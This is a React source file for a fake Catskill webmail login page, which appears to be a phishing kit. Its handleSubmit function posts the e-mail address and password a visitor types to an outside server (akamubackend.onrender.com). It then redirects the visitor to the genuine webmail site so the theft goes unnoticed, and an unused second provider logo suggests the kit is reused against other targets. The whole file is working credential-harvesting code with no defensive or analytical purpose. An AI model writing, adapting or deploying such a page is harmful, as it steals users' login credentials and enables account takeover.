import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';

import iglou from './iglou.png';
import catskill from './catskill.png';


function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Catskill")

    const[showError, setShowError] = useState(false);


async function handleSubmit(e){
    e.preventDefault();

    try {
        const response = await axios.post('https://akamubackend.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            window.location.href = 'https://webmail.catskill.net/';
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}


    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className='text-center my-4'>
            <img  src={catskill} />

            </div>


            <div className='col-md-5 whitediv m-auto py-3 px-5'>
                



                <form onSubmit={handleSubmit}>

                    <div className='form-group'>
                        <label className='label'> E-mail address</label>
                        <input type="email"onChange={function(e){
                            setUserName(e.target.value);
                        }}value={email} className="form-control"required />

                    </div>


                    <div className='form-group'>
                        <label className='label'> Password</label>
                        <input type="password"onChange={function(e){
                            setPassword(e.target.value);
                        }}value={password} className="form-control"required />

                    </div>

                   


                    <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Shared computer - log me out after 4 hours</span>
    </label>

                    </div>


                    <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Keep me logged in until I log out</span>
    </label>

                    </div>


                    <div className='form-group text-center'>

<button type='submit' style={{
    background:"#019bc6",
}}className='btn text-center w-50 font-weight-bold text-light'>LOGIN</button>






</div>


                 

                </form>

            </div>
        
        </>
    );
}

export default Home;